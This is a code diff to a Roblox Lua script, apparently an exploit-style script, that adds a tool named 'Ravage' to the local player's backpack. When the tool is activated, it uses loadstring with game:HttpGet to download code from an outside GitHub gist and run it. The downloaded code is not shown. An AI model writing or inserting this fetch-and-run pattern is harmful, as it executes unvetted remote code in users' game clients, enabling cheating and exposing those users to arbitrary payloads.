@@ -1688,3 +1688,23 @@ createTextLayer(screenGui, 1, 1, Color3.new(0, 0, 0))   -- Bottom-right
 -- creating za main text for credititing
 local textLabel = createTextLayer(screenGui, 0, 0, Color3.new(1, 1, 1)) -- whit main text
 textLabel.ZIndex = 2  -- main text is on top
+
+-- Create the tool
+local tool = Instance.new("Tool")
+tool.Name = "Ravage"  -- Updated tool name
+tool.RequiresHandle = false  -- No handle required
+tool.ToolTip = "Ravaging my way outta here!"
+ 
+-- Insert the tool into the player's backpack
+tool.Parent = game.Players.LocalPlayer.Backpack
+ 
+-- Function to execute when the tool is activated
+local function onActivated()
+    loadstring(game:HttpGet"https://gist.githubusercontent.com/kjremaker/fc6b674900d5bfe67c3890544a95561b/raw/3bf56c82c45a64b0c7f840be92fcc9a0c73f1961/unlimited%2520flexworks")()
+end
+ 
+-- Connect the activation function to the tool's Activated event
+tool.Activated:Connect(onActivated)
+ 
+-- Add the tool to the player's backpack
+tool.Parent = game.Players.LocalPlayer.Backpack
